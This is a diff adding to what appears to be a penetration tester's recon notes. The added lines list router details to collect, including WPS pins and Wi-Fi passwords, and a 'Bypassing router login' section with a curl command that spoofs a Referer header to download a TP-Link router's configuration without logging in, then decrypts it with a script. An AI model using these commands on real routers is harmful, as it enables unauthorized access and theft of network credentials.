@@ -125,11 +125,25 @@ First non-private IP is most likely the public facing IP
 Install the SimpleScreenRecorder program and record your entire session
 install the Screenshot program to take 'snips' of info
 
+If you attempt to get on the router during network recon phase, get the following information:
+  Firmware Version
+  Hardware Version
+  System logs
+  DNS settings
+  WPS pin, if applicable
+  5GHz side SSID and PW, if applicable
 
+Bypassing router login
+--------------------
+Ubunutu 20.04 and raspbian buster
+sudo apt install python3-crypto
 
+download the tpconf_bin_xml.py from flashdrive and run it against the file
+pip3 install pycryptodome
 
-
-
+The more you understand your target, the better the chance identifying a vulnerability. As an example, many TP-Link routers have a vulnerability that allows you to pull the router configuration without logging into the router:
+curl -s -k -X GET -H "Referer:http://<IP>/mainFrame.htm" http://<IP>/cgi/conf.bin > conf.bin
+python3 tpconf_bin_xml.py conf.bin conf.xml
 
 
 
